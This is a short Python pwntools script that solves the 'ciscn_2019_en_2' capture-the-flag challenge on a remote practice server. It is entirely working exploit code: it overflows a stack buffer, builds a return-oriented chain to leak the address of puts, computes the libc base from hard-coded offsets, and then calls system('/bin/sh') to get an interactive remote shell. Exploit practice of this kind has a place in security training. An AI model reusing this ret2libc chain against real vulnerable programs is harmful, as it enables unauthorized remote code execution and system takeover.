from pwn import *


# p = process("./ciscn_2019_en_2")
p = remote("node4.buuoj.cn", 26056)
pro = ELF("./ciscn_2019_en_2")

puts_p = pro.plt["puts"]
puts_g = pro.got["puts"]
start = 0x0000000000400790
pop_rdi_ret = 0x0000000000400c83
ret = pop_rdi_ret+0x1 

# leak libc
def leak():
    p.recvuntil("Input your choice!\n")
    p.sendline("1")
    p.recvuntil("Input your Plaintext to be encrypted\n")
    pad = cyclic(0x50+0x8)+p64(pop_rdi_ret)+p64(puts_g)+p64(puts_p)
    pad += p64(start)
    p.sendline(pad)
    p.recvuntil("Ciphertext\n")
    p.recvline()
    info = p.recvuntil("\nE", drop=True)

    return info

info = leak()
info = u64(info.ljust(8, b"\x00"))
print("puts: ", hex(info))

# count offset
base = info-0x809c0
system = base+0x4f440
binsh = base+0x1b3e9a

# attack
p.recv()
p.sendline("1")
p.recv()
pad = cyclic(0x50+0x8)
pad += p64(ret)+p64(pop_rdi_ret)+p64(binsh)+p64(system)
p.sendline(pad)

p.interactive()


